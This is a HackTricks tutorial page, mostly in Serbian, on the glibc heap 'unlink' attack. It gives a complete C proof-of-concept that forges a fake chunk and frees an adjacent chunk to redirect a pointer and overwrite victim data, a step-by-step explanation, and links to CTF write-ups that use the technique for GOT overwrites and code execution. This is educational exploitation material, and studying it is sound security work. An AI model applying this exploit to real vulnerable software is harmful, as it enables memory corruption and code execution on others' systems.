# Unlink Attack

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Osnovne informacije

Kada je ovaj napad otkriven, uglavnom je omogućavao WWW (Write What Where), međutim, neki **provere su dodate** što je novu verziju napada učinilo zanimljivijom, složenijom i **beskorisnom**.

### Primer koda:

<details>

<summary>Kod</summary>
```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// Altered from https://github.com/DhavalKapil/heap-exploitation/tree/d778318b6a14edad18b20421f5a06fa1a6e6920e/assets/files/unlink_exploit.c to make it work

struct chunk_structure {
size_t prev_size;
size_t size;
struct chunk_structure *fd;
struct chunk_structure *bk;
char buf[10];               // padding
};

int main() {
unsigned long long *chunk1, *chunk2;
struct chunk_structure *fake_chunk, *chunk2_hdr;
char data[20];

// First grab two chunks (non fast)
chunk1 = malloc(0x8000);
chunk2 = malloc(0x8000);
printf("Stack pointer to chunk1: %p\n", &chunk1);
printf("Chunk1: %p\n", chunk1);
printf("Chunk2: %p\n", chunk2);

// Assuming attacker has control over chunk1's contents
// Overflow the heap, override chunk2's header

// First forge a fake chunk starting at chunk1
// Need to setup fd and bk pointers to pass the unlink security check
fake_chunk = (struct chunk_structure *)chunk1;
fake_chunk->size = 0x8000;
fake_chunk->fd = (struct chunk_structure *)(&chunk1 - 3); // Ensures P->fd->bk == P
fake_chunk->bk = (struct chunk_structure *)(&chunk1 - 2); // Ensures P->bk->fd == P

// Next modify the header of chunk2 to pass all security checks
chunk2_hdr = (struct chunk_structure *)(chunk2 - 2);
chunk2_hdr->prev_size = 0x8000;  // chunk1's data region size
chunk2_hdr->size &= ~1;        // Unsetting prev_in_use bit

// Now, when chunk2 is freed, attacker's fake chunk is 'unlinked'
// This results in chunk1 pointer pointing to chunk1 - 3
// i.e. chunk1[3] now contains chunk1 itself.
// We then make chunk1 point to some victim's data
free(chunk2);
printf("Chunk1: %p\n", chunk1);
printf("Chunk1[3]: %x\n", chunk1[3]);

chunk1[3] = (unsigned long long)data;

strcpy(data, "Victim's data");

// Overwrite victim's data using chunk1
chunk1[0] = 0x002164656b636168LL;

printf("%s\n", data);

return 0;
}

```
</details>

* Napad ne funkcioniše ako se koriste tcaches (posle 2.26)

### Cilj

Ovaj napad omogućava da **promenite pokazivač na deo da pokazuje 3 adrese pre sebe**. Ako se ova nova lokacija (okolina gde je pokazivač bio smešten) sadrži zanimljive stvari, kao što su druge kontrolisane alokacije / stek..., moguće je da ih pročitate/prepišete kako biste izazvali veću štetu.

* Ako je ovaj pokazivač bio smešten u steku, pošto sada pokazuje 3 adrese pre sebe i korisnik potencijalno može da ga pročita i izmeni, biće moguće da se otkriju osetljive informacije iz steka ili čak da se izmeni adresa povratka (možda) bez dodirivanja kanarija.
* U skladu sa CTF primerima, ovaj pokazivač se nalazi u nizu pokazivača na druge alokacije, stoga, čineći ga da pokazuje 3 adrese pre i mogućnošću da ga pročita i piše, moguće je da se drugi pokazivači usmere na druge adrese.\
Pošto korisnik potencijalno može da čita/piše i druge alokacije, može da otkrije informacije ili prepiše nove adrese na proizvoljnim lokacijama (kao u GOT-u).

### Zahtevi

* Neka kontrola u memoriji (npr. stek) da se kreira nekoliko delova dodeljujući vrednosti nekim od atributa.
* Stek leak kako bi se postavili pokazivači lažnog dela.

### Napad

* Postoji nekoliko delova (chunk1 i chunk2)
* Napadač kontroliše sadržaj chunk1 i zaglavlja chunk2.
* U chunk1 napadač kreira strukturu lažnog dela:
* Da bi zaobišao zaštite, osigurava da je polje `size` ispravno kako bi izbegao grešku: `corrupted size vs. prev_size while consolidating`
* i polja `fd` i `bk` lažnog dela pokazuju gde je pokazivač chunk1 smešten sa pomerajima od -3 i -2 respektivno, tako da `fake_chunk->fd->bk` i `fake_chunk->bk->fd` pokazuju na poziciju u memoriji (stek) gde se nalazi prava adresa chunk1:

<figure><img src="../../.gitbook/assets/image (1245).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

* Zaglavlja chunk2 su modifikovana da označe da prethodni deo nije korišćen i da je veličina veličina sadržanog lažnog dela.
* Kada se drugi deo oslobodi, tada se ovaj lažni deo unlink-uje dešavajući:
* `fake_chunk->fd->bk` = `fake_chunk->bk`
* `fake_chunk->bk->fd` = `fake_chunk->fd`
* Prethodno je napravljeno da `fake_chunk->fd->bk` i `fake_chunk->bk->fd` pokazuju na isto mesto (lokaciju u steku gde je `chunk1` bio smešten, tako da je to bila validna povezana lista). Pošto **oba pokazuju na istu lokaciju**, samo će poslednji (`fake_chunk->bk->fd = fake_chunk->fd`) imati **efekat**.
* Ovo će **prepisati pokazivač na chunk1 u steku na adresu (ili bajtove) smeštene 3 adrese pre u steku**.
* Stoga, ako bi napadač mogao ponovo da kontroliše sadržaj chunk1, moći će da **piše unutar steka** potencijalno prepisujući adresu povratka preskočivši kanarija i menjajući vrednosti i pokazivače lokalnih promenljivih. Čak i ponovo menjajući adresu chunk1 smeštenu u steku na drugu lokaciju gde, ako bi napadač ponovo mogao da kontroliše sadržaj chunk1, mogao bi da piše bilo gde.
* Imajte na umu da je ovo bilo moguće jer su **adrese smeštene u steku**. Rizik i eksploatacija mogu zavisiti od **gde su adrese lažnog dela smeštene**.

<figure><img src="../../.gitbook/assets/image (1246).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

## Reference

* [https://heap-exploitation.dhavalkapil.com/attacks/unlink\_exploit](https://heap-exploitation.dhavalkapil.com/attacks/unlink\_exploit)
* Iako bi bilo čudno pronaći unlink napad čak i u CTF-u, ovde imate neke izveštaje gde je ovaj napad korišćen:
* CTF primer: [https://guyinatuxedo.github.io/30-unlink/hitcon14\_stkof/index.html](https://guyinatuxedo.github.io/30-unlink/hitcon14\_stkof/index.html)
* U ovom primeru, umesto steka postoji niz malloc'ovanih adresa. Unlink napad se izvodi kako bi se mogla alocirati chunk ovde, stoga se može kontrolisati pokazivače niza malloc'ovanih adresa. Zatim, postoji još jedna funkcionalnost koja omogućava modifikaciju sadržaja chunk-ova u ovim adresama, što omogućava usmeravanje adresa na GOT, modifikaciju adresa funkcija za dobijanje leak-ova i RCE.
* Još jedan CTF primer: [https://guyinatuxedo.github.io/30-unlink/zctf16\_note2/index.html](https://guyinatuxedo.github.io/30-unlink/zctf16\_note2/index.html)
* Baš kao u prethodnom primeru, postoji niz adresa alokacija. Moguće je izvršiti unlink napad kako bi se adresa prve alokacije usmerila nekoliko pozicija pre početka niza i prepisala ovu alokaciju na novoj poziciji. Stoga, moguće je prepisati pokazivače drugih alokacija da pokazuju na GOT funkcije atoi, ispisati je da bi se dobio libc leak, a zatim prepisati atoi GOT sa adresom do jednog gadget-a.
* CTF primer sa prilagođenim malloc i free funkcijama koje zloupotrebljavaju ranjivost vrlo sličnu unlink napadu: [https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw17\_minesweeper/index.html](https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw17\_minesweeper/index.html)
* Postoji overflow koji omogućava kontrolu FD i BK pokazivača prilagođenog malloc-a koji će biti (prilagođeni) oslobođeni. Štaviše, heap ima exec bit, tako da je moguće otkriti adresu heap-a i usmeriti funkciju iz GOT-a na heap chunk sa shellcode-om za izvršavanje.

{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitter-u** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove podnošenjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
